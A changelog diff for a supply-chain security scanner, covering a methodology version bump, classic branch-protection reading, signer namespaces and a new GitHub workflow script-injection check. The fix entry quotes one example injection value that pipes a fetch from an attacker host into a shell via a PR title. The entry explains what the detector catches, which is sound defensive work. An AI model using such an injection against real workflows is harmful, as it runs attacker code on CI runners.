@@ -21,7 +21,7 @@ versions.
 
   `--local` runs the full control set where those checks are observable and
   writes a **directory `ScanRecord`** — the public directory's own schema,
-  `schema_version` 1 and `methodology_version` 1, every required field present
+  `schema_version` 1 and `methodology_version` 2, every required field present
   — to the **committed** path `.sscsb/scan-record.local.json`, with one added
   `local` block binding it to the repository, the commit and the signer. It
   signs those exact bytes with the key git already signs commits with —
@@ -181,6 +181,29 @@ versions.
 
 ### Changed
 
+- **`branch-protection` reads classic branch protection, and the public
+  `protected` flag when it cannot.** It read only the rulesets API, which
+  answers `[]` for a branch protected the classic way — proven live on a
+  throwaway repository with required reviews, admin enforcement and
+  force-push/deletion blocks all active — so a fully protected repository
+  scored as unprotected, worse than OpenSSF Scorecard, which reads both. Three
+  reads now, in order: rulesets; when that is `[]`, the classic endpoint,
+  translated into the same rule shapes so every rule check and Scorecard knob
+  scores it identically; when that too is refused (it is admin-only), the
+  public branch record's `protected` flag — `true` is `DEGRADED` ("protection
+  exists; its settings need an admin token"), never a pass from a flag, and
+  `false` is `FAIL`. The live probe also caught GitHub answering
+  `GET /branches/{name}` for a name that does not exist with the *default*
+  branch's record, through a redirect `gh api` follows silently; the flag is
+  trusted only when the record names the branch asked for, and a mismatch is
+  "not found" and verifies nothing.
+
+- **`METHODOLOGY_VERSION` 1 → 2.** The read above changes published verdicts
+  for classic-protected repositories, and the increments that follow it in the
+  same series (verify gates that run their tools, three new controls) change
+  more. One bump covers the series; the docs' contract block and its pinned
+  digest move with it, and the directory's mirror moves in its own change.
+
 - **Generated `allowed_signers` lines now grant two namespaces to `human`-class
   signers**, `namespaces="git,sscsb-scan-record"` rather than
   `namespaces="git"`. SSHSIG namespaces stop a signature minted for one protocol
@@ -204,6 +227,18 @@ versions.
   refuse independently.
 
 ### Fixed
+
+- **`workflow-audit-extended` detects script injection.** The namesake of
+  OpenSSF Scorecard's Dangerous-Workflow check had no detection at all: an
+  issue title, a PR body, a commit message or a branch name interpolated into a
+  `run:` step with `${{ }}` is expanded by the runner before the shell parses
+  the script, so `"; curl attacker | sh; "` in a PR title runs as the
+  workflow. Every attacker-controlled context in Scorecard's own set (plus
+  `discussion.*` and `blocked_user.*`) in a `run:` body is now an `Error`
+  finding naming the context and the fix. It is scoped to `run:` exactly as
+  Scorecard scopes it: the same context in `with:`, `env:` or `concurrency:`
+  does not fire, and the documented safe pattern — bind it in `env:`, read it
+  as `"$VAR"` — is asserted clean.
 
 - **A test read `PATH` without the environment lock and failed as if the code
   had regressed.** `scan::tests::run_scan_surfaces_a_clear_error_when_the_vex_path_does_not_exist`
